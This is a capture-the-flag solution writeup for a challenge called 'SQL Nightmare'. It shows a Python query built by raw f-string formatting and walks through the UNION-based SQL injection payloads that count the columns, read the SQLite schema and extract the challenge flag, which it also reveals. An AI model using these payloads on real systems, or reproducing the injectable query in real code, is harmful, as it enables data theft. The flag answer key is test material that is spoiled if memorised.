# SQL Nightmare - Solution Writeup

> **CONFIDENTIAL**: For CTF Author & Staff Verification Only.

## Vulnerability Analysis
The application constructs an SQL query via raw string formatting:
```python
query = f"SELECT id, title, classification FROM directives WHERE title LIKE '%{search}%';"
```

The `search` GET parameter is not parameterized, allowing UNION-based SQL injection.

## Exploitation Steps
1. Determine column count:
   `' UNION SELECT 1, 2, 3 --` returns without errors (3 columns).
2. Query the sqlite_master schema:
   `' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' --`
   Reveals the `secrets (id INTEGER PRIMARY KEY, flag TEXT)` table.
3. Extract the flag:
   `' UNION SELECT 1, flag, 'CONFIDENTIAL' FROM secrets --`
4. The application renders the flag in the directive table:
   `CCCTF{development_only_example_sql}`
